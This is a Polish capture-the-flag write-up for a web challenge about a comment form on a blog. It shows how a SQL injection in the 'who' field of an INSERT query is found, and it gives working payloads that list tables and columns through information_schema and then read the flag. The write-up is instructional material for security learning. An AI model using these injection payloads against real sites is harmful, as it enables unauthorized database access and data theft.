# Bezpieczny blog
#####  web
##### Punkty: 150
##### Rozwiązań: 6

>Niedawno postanowiłem ochronić swój blog przed rozmaitymi cyberzagrożeniami poprzez wdrożenie na nim Content-Security-Policy. Nigdy więcej cyberataków!
> Mój blog: https://blog.pwning2017.p4.team/.
---

Pod podanym adresem znajdujemy stronę:
```html
<h1>Cyber Security Blog</h1>
<p>
    Welcome to my cyber security blog. There is no content yet because I'm too busy with fighting malware
    on all OSI layers. You may leave a comment tho.
</p>
<h2>Comments</h2>
<h2>Post comment</h2>
<form action="/submit" method="POST">
    <input type="hidden" name="post_id" value="1"><br>
    Who: <input type="text" name="who"><br>
    Text: <input type="text" name="text">

    <button type="submit">Submit</button>
</form>
```

Po przesłaniu znaku `"` w parametrze `who` serwer odpowiada HTTP 500 Internal Server Error. Można więc przypuszczać, że kod serwera podatny jest na SQL Injection.
Wysyłając `aaa"` w parametrze `who` i `"bbb` w paremetrze text dostajemy `aaa", content = "bbb None` co potwierdza nasze przypuszczenie. Zapytanie wysyłane do bazy zapewne konstruowane jest w sposób następujący:
`INSERT INTO table_name SET who="...", content="...";`

Możemy to wykorzystać żeby wyciągnąć z bazy takie dane jak nazwy tabel i nazwy kolumn.
W parametrze `who` podajemy `", content=(SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 0)#`, oraz `", content=(SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 1)#` aby dodać komentarze zawierające nazwy dwóch tabel - `blog_comment` i `ctf_flag`.

Aby poznać nazwy kolumn odpowiednich tabel, parametr `who` ustawiamy następująco: `", content=(SELECT column_name FROM information_schema.columns WHERE table_name = 'blog_comment' LIMIT 1 OFFSET 1)#`, odpowiednio manipulując parametrmi `table_name` i `OFFSET`.

Po wykonaniu powyższych kroków znamy już schemat bazy który wygląda następująco:
* `blog_comment(id, instance, post_id, who, content)`
* `ctf_flag(flag)`

Ustawiając paremetr `who` na `", content=(SELECT flag from ctf_flag LIMIT 1)#` dodajemy komentarz, którego treścią jest flaga.